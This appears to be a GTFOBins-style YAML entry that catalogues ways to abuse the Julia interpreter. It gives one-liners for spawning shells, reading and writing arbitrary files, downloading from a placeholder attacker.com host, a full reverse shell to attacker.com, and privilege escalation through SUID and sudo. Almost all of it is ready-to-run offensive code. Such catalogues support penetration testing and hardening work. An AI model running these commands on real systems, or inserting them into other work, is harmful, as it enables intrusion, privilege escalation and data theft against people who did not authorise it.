---
functions:
  shell:
    - code: |
        julia -e 'run(`/bin/sh`)'
  file-read:
    - code: |
        export LFILE=file_to_read
        julia -e 'print(open(f->read(f, String), ENV["LFILE"]))'
  file-write:
    - code: |
        export LFILE=file_to_write
        julia -e 'open(f->write(f, "DATA"), ENV["LFILE"], "w")'
  file-download:
    - code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=file_to_save
        julia -e 'download(ENV["URL"], ENV["LFILE"])'
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        julia -e 'using Sockets; sock=connect(ENV["RHOST"], parse(Int64,ENV["RPORT"])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
  suid:
    - code: |
        ./julia -e 'run(`/bin/sh -p`)'
  sudo:
    - code: |
        sudo julia -e 'run(`/bin/sh`)'
---
